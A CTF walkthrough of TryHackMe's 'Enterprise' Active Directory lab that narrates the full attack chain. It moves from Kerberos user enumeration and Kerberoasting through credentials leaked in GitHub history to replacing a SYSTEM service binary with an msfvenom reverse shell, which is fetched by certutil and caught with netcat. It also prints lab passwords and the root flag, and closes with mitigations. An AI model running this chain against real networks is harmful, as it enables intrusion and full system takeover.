# Enterprise CTF Walkthrough

**Target:** Enterprise
**Source:** [TryHackMe](https://tryhackme.com/room/enterprise)
**Difficulty:** Hard
**Objective:** Read `user.txt` and `root.txt`
**Target IP:** 10.81.140.48

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Kerberos Username Enumeration](#kerberos-username-enumeration)
- [AS-REP Roasting Attempt (Dead End)](#as-rep-roasting-attempt-dead-end)
- [OSINT via GitHub](#osint-via-github)
- [Kerberoasting the bitbucket Service Account](#kerberoasting-the-bitbucket-service-account)
- [Foothold via RDP (bitbucket)](#foothold-via-rdp-bitbucket)
- [Privilege Escalation via ZeroTierOne Service](#privilege-escalation-via-zerotierone-service)
- [Room Answers](#room-answers)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

Enterprise is a hard-difficulty Active Directory box where the domain
itself gives up very little through classic Kerberos attacks — username
enumeration succeeds, but AS-REP Roasting against every discovered
account comes back empty. The actual path in runs through the
organization's public GitHub presence: an "About Us" README points at a
developer's personal account, whose management-script repository leaks a
plaintext domain credential in its very first commit. Those credentials
are just privileged enough to run a Kerberoasting request, and the
recovered service ticket for the `bitbucket` account cracks quickly
against `rockyou.txt`. From there, RDP access and a `winPEAS` sweep
surface a textbook unquoted/writable service-binary privilege escalation
against `ZeroTierOneService`, running as `NT AUTHORITY\SYSTEM`.

**Key Skills Required:**
- Active Directory service enumeration (`nmap`)
- Kerberos username enumeration (`kerbrute`)
- AS-REP Roasting (`impacket-GetNPUsers`)
- OSINT / public source-control credential hunting (GitHub commit history)
- Kerberoasting (`impacket-GetUserSPNs`)
- Offline Kerberos ticket cracking (`john`, krb5tgs)
- RDP access (`xfreerdp`)
- Windows local enumeration (`winPEAS`)
- Writable-service-binary privilege escalation

---

## Reconnaissance

Before scanning, the target IP is mapped to its domain name:

```bash
echo "10.81.140.48 enterprise.thm" | sudo tee -a /etc/hosts
```

### Network Scanning

```bash
nmap -sVC -O -p- -T4 enterprise.thm
```

**Results (relevant ports):**

| Port | Service | Version |
|------|---------|---------|
| 53/tcp | domain | Simple DNS Plus |
| 80/tcp | http | Microsoft IIS httpd 10.0 |
| 88/tcp | kerberos-sec | Microsoft Windows Kerberos |
| 135/tcp | msrpc | Microsoft Windows RPC |
| 139/tcp | netbios-ssn | Microsoft Windows netbios-ssn |
| 389/tcp | ldap | Active Directory LDAP (Domain: ENTERPRISE.THM) |
| 445/tcp | microsoft-ds | — |
| 464/tcp | kpasswd5 | — |
| 593/tcp | ncacn_http | Microsoft Windows RPC over HTTP |
| 636/tcp | tcpwrapped | — |
| 3268/tcp | ldap | Active Directory Global Catalog |
| 3269/tcp | tcpwrapped | — |
| 3389/tcp | ms-wbt-server | Microsoft Terminal Services |
| 5985/tcp | http | WinRM (Microsoft-HTTPAPI/2.0) |
| 7990/tcp | http | Microsoft IIS (Atlassian login page) |
| 9389/tcp | mc-nmf | .NET Message Framing (AD Web Services) |

The port spread (88, 389, 445, 3268...) immediately confirms a Domain
Controller, and the LDAP banner names the domain directly:

```
Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM, Site: Default-First-Site-Name)
```

The RDP certificate subject further narrows the internal naming:

```
Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM
```

```
Target_Name: LAB-ENTERPRISE
DNS_Domain_Name: LAB.ENTERPRISE.THM
DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM
DNS_Tree_Name: ENTERPRISE.THM
```

The real Kerberos realm to target is `LAB.ENTERPRISE.THM`, not the
top-level `ENTERPRISE.THM` seen on the website. Port 7990 additionally
flags an Atlassian product login page — worth revisiting after initial
AD attacks are exhausted.

---

## Kerberos Username Enumeration

```bash
chmod +x kerbrute_linux_amd64
./kerbrute_linux_amd64 userenum -d LAB.ENTERPRISE.THM --dc 10.81.140.48 \
  /home/kali/Documents/xato-net-10-million-usernames.txt
```

```
[+] VALID USERNAME:	guest@LAB.ENTERPRISE.THM
[+] VALID USERNAME:	administrator@LAB.ENTERPRISE.THM
[+] VALID USERNAME:	cake@LAB.ENTERPRISE.THM
[+] VALID USERNAME:	enterprise@LAB.ENTERPRISE.THM
[+] VALID USERNAME:	nik@LAB.ENTERPRISE.THM
[+] VALID USERNAME:	spooks@LAB.ENTERPRISE.THM
[+] VALID USERNAME:	joiner@LAB.ENTERPRISE.THM
```

(`banana` was also confirmed valid alongside the above.) Eight usernames
are now confirmed to exist in the domain, saved for the next step:

```bash
nano usernames.txt
```

---

## AS-REP Roasting Attempt (Dead End)

With a confirmed username list, the obvious next move is to check whether
any of these accounts have Kerberos pre-authentication disabled
(`UF_DONT_REQUIRE_PREAUTH`), which would allow an AS-REP hash to be
requested with no credentials at all:

```bash
impacket-GetNPUsers LAB.ENTERPRISE.THM/ -usersfile usernames.txt \
  -format hashcat -outputfile hashes.txt -dc-ip 10.81.140.48 -no-pass
```

```
[-] User banana@LAB.ENTERPRISE.THM doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User guest@LAB.ENTERPRISE.THM doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator@LAB.ENTERPRISE.THM doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User cake@LAB.ENTERPRISE.THM doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise@LAB.ENTERPRISE.THM doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nik@LAB.ENTERPRISE.THM doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User spooks@LAB.ENTERPRISE.THM doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User joiner@LAB.ENTERPRISE.THM doesn't have UF_DONT_REQUIRE_PREAUTH set
```

**Dead end.** Every enumerated account requires standard Kerberos
pre-authentication, so no AS-REP hash is obtainable this way. With the
domain itself offering nothing further for now, attention shifts to the
web-facing side of the organization instead.

---

## OSINT via GitHub

```bash
curl http://enterprise.thm
```

```html
<h1> Enterprise Domain Controller. Keep out! </h1>
```

The root site is a placeholder. Port 7990, flagged earlier by Nmap as an
Atlassian login page, is checked next:

```
http://enterprise.thm:7990
```

```
Reminder to all Enterprise-THM Employees:
We are moving to Github!
```

This points straight at a real GitHub organization:

```
https://github.com/Enterprise-THM
```

The org has a single repository, `About-Us`, whose `README.md` reads:

```
Welcome to Enterprise.THM

Enterprise.THM is the latest and greatest company on the NYSE. Later on,
you'll be able to view all of our awesome free, open source trading
algorithms. Stay tuned for more details.

- Enterprise.THM Team
```

No code of substance here, but it's enough to pivot to looking for
individual employee accounts on GitHub, which turns up:

```
https://github.com/Nik-enterprise-dev
```

This personal account hosts its own repository with a management script:

```
https://github.com/Nik-enterprise-dev/mgmtScript.ps1/blob/main/SystemInfo.ps1
```

```powershell
Import-Module ActiveDirectory
$userName = ''
$userPassword = ''
$psCreds = ConvertTo-SecureString $userPassword -AsPlainText -Force
$Computers = New-Object -TypeName "System.Collections.ArrayList"
$Computer = $(Get-ADComputer -Filter * | Select-Object Name)
for ($index = -1; $index -lt $Computer.count; $index++) { Invoke-Command -ComputerName $index {systeminfo} }
```

The current version has the credential fields scrubbed — but the file's
commit history has not been cleaned up. Checking the commit log and
opening the very first commit reveals the original, unredacted script:

```
https://github.com/Nik-enterprise-dev/mgmtScript.ps1/commits/main/SystemInfo.ps1
https://github.com/Nik-enterprise-dev/mgmtScript.ps1/commit/bc40c9f237bfbe7be7181e82bebe7c0087eb7ed8
```

```powershell
$userName = 'nik'
$userPassword = 'ToastyBoi!'
```

Recovered credentials: `nik : ToastyBoi!`

---

## Kerberoasting the bitbucket Service Account

With a valid domain credential in hand, Kerberoasting becomes possible —
requesting service tickets for every account with a registered SPN:

```bash
impacket-GetUserSPNs LAB.ENTERPRISE.THM/nik:'ToastyBoi!' -request
```

```
ServicePrincipalName  Name       MemberOf
--------------------  ---------  -------------------------------------------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,...
```

A TGS ticket is returned for the `bitbucket` service account (encryption
type 23 — RC4/krb5tgs), saved locally and cracked offline:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

```
littleredbucket  (?)
1g 0:00:00:00 DONE
```

Recovered credentials: `bitbucket : littleredbucket`

---

## Foothold via RDP (bitbucket)

```bash
xfreerdp /v:10.81.140.48:3389 /u:bitbucket /d:LAB.ENTERPRISE.THM /p:littleredbucket
```

The login succeeds, and `user.txt` is present directly on the desktop:

```
C:\Users\bitbucket\Desktop\user.txt
```

> **Note:** the recovered notes confirm reaching and viewing this file but
> don't record its printed content — unlike the room's other flag, this
> value wasn't captured during the run, so it's omitted from the Room
> Answers table below rather than guessed.

---

## Privilege Escalation via ZeroTierOne Service

`winPEAS` is staged on the attacker machine and pulled onto the target:

```bash
curl -LO https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1
python3 -m http.server --bind=192.168.131.60 8080
```

```powershell
certutil -urlcache -split -f http://192.168.131.60:8080/winPEAS.ps1 winPEAS.ps1
powershell -ep bypass
.\winPEAS.ps1
```

The scan flags a textbook writable-service-binary privilege escalation:

```
Service: ZeroTierOneService
Runs as: NT AUTHORITY\SYSTEM
Binary Path: C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
Binary Writable: YES
```

A service running as `SYSTEM` with a binary path that the current,
low-privileged user can overwrite is a direct path to a SYSTEM shell. A
reverse-shell payload is generated and staged the same way `winPEAS` was:

```bash
msfvenom -p windows/x64/shell_reverse_tcp -f exe LHOST=192.168.131.60 LPORT=9012 -o zero.exe
python3 -m http.server --bind=192.168.131.60 8080
```

```powershell
certutil -urlcache -split -f http://192.168.131.60:8080/zero.exe zero.exe
```

The payload replaces the legitimate service binary at its exact path:

```powershell
cd "C:\Program Files (x86)\Zero Tier\Zero Tier One"
dir
```

```
ZeroTier One.exe   (overwritten with zero.exe, same filename)
```

A listener is started before the service is (re)started, which executes
the payload with the service's SYSTEM privileges:

```bash
rlwrap nc -nvlp 9012
```

```powershell
net start zerotieroneservice
```

```
connect to [192.168.131.60] from (UNKNOWN) [10.81.140.48] 51302
C:\Windows\system32>whoami
nt authority\system
```

```powershell
cd C:\Users\Administrator\Desktop
dir
more root.txt
```

```
THM{1a1fa94875421296331f145971ca4881}
```

> **Root flag:** `THM{1a1fa94875421296331f145971ca4881}`

---

## Room Answers

| Flag | Value |
|---|---|
| user.txt | *reached on `bitbucket`'s desktop; value not recorded in notes* |
| root.txt | `THM{1a1fa94875421296331f145971ca4881}` |

---

## Vulnerabilities

### 1. Kerberos Username Enumeration via Pre-Authentication Responses (Low)

**Description:** The domain's Kerberos service (port 88) responds
differently to requests for valid versus invalid usernames, allowing
`kerbrute` to enumerate a full list of valid domain accounts with no
credentials.

**Impact:** Supplies the username list needed for every subsequent
Kerberos-based attack (AS-REP Roasting, Kerberoasting).

**Mitigation:**
- This is inherent to the Kerberos protocol and difficult to fully
  eliminate; mitigate with account lockout policies, monitoring for
  high-volume AS-REQ traffic, and rate-limiting from a single source.

### 2. Plaintext Domain Credentials Committed to a Public GitHub Repository (Critical)

**Description:** A PowerShell management script belonging to a domain
user (`nik`) was pushed to a personal, public GitHub repository with
hardcoded plaintext credentials in its initial commit. Although a later
commit scrubbed the values from the current file, the credential-bearing
commit remained fully accessible through the repository's history.

**Impact:** Direct disclosure of a valid domain credential, which went on
to enable a successful Kerberoasting attack against a sensitive service
account.

**Mitigation:**
- Never commit credentials to source control, even temporarily — scrubbing
  a later commit does not remove the exposure from history.
- Treat any repository that ever contained a secret as compromised: rotate
  the credential and consider rewriting history (`git filter-repo` /
  BFG) in addition to the rotation.
- Use dedicated secrets management (environment variables, vaults,
  managed identities) instead of hardcoded script variables.
- Audit public and employee-personal repositories for organizational
  exposure as part of routine security hygiene.

### 3. Kerberoastable Service Account with a Weak Password (Critical)

**Description:** The `bitbucket` service account, a member of a group
named `sensitive-account`, had a registered SPN (`HTTP/LAB-DC`) and a
password weak enough to be cracked from its Kerberoasted TGS ticket
against `rockyou.txt` in under a second.

**Impact:** Any authenticated domain user — even one with minimal
privileges, like `nik` — could request and crack this account's ticket
offline, yielding a second, apparently more privileged credential and an
interactive RDP foothold.

**Mitigation:**
- Use long, random passwords (25+ characters) for all service accounts,
  or managed service accounts (gMSA) where supported, which rotate
  credentials automatically and aren't practically crackable.
- Minimize the number of accounts with registered SPNs, and monitor for
  Kerberoasting-pattern ticket requests (TGS-REQ for unusual SPNs).

### 4. Writable Service Binary Running as SYSTEM (Critical)

**Description:** `ZeroTierOneService` runs as `NT AUTHORITY\SYSTEM`, but
its binary at `C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier
One.exe` was writable by a low-privileged local user.

**Impact:** Full privilege escalation to SYSTEM by replacing the service
binary with an attacker-controlled payload and restarting the service.

**Mitigation:**
- Restrict write access to service binary directories and files to
  Administrators/SYSTEM only — a standard user or service account should
  never be able to modify a binary that runs with elevated privileges.
- Audit installed third-party software for weak ACLs on its installation
  directory, especially software that installs a privileged Windows
  service.

---

## Attack Chain Summary

```
Nmap scan → Domain Controller fingerprint (Kerberos, LDAP, SMB, RDP, port 7990 Atlassian)
    ↓
kerbrute userenum → 8 valid domain usernames
    ↓
impacket-GetNPUsers (AS-REP Roasting) → no accounts vulnerable (DEAD END)
    ↓
port 7990 banner → "We are moving to Github!" → github.com/Enterprise-THM
    ↓
About-Us README → personal dev account: Nik-enterprise-dev
    ↓
mgmtScript.ps1 commit history → first commit leaks nik:ToastyBoi!
    ↓
impacket-GetUserSPNs (nik creds) → Kerberoast bitbucket's TGS ticket
    ↓
john --wordlist=rockyou.txt → bitbucket:littleredbucket
    ↓
xfreerdp bitbucket → foothold, user.txt reached
    ↓
winPEAS.ps1 → ZeroTierOneService: SYSTEM, writable binary path
    ↓
msfvenom payload overwrites ZeroTier One.exe → net start zerotieroneservice
    ↓
nc listener → NT AUTHORITY\SYSTEM → root.txt
    ↓
Room complete
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning, service/OS detection, AD fingerprinting |
| kerbrute | Kerberos username enumeration |
| Impacket (`GetNPUsers`) | AS-REP Roasting attempt |
| cURL | Web/GitHub recon |
| GitHub commit history | Credential recovery from a scrubbed script |
| Impacket (`GetUserSPNs`) | Kerberoasting |
| John the Ripper | Cracking the krb5tgs hash |
| xfreerdp | RDP foothold access |
| winPEAS | Windows local privilege-escalation enumeration |
| msfvenom | Windows reverse-shell payload generation |
| Python HTTP server / certutil | File staging and delivery to the target |
| netcat (nc) / rlwrap | Reverse shell listener |

---

## References

- [TryHackMe — Enterprise](https://tryhackme.com/room/enterprise)
- [kerbrute (GitHub)](https://github.com/ropnop/kerbrute)
- [AS-REP Roasting — MGamalCYSEC](https://github.com/MGamalCYSEC/Active-Directory-Enumeration-and-Attacks/blob/main/Active%20Directory%20Attacks/AS-REP%20Roasting.md)
- [Impacket scripts — Kali docs](https://www.kali.org/tools/impacket-scripts/#impacket-getnpusers)
- [SecLists — Passwords](https://gitlab.com/kalilinux/packages/seclists/-/tree/0aab3b70769ed9faf79b3c1159fb32ef131c7ee6/Passwords)
- [PEASS-ng / winPEAS (GitHub)](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASps1)

---
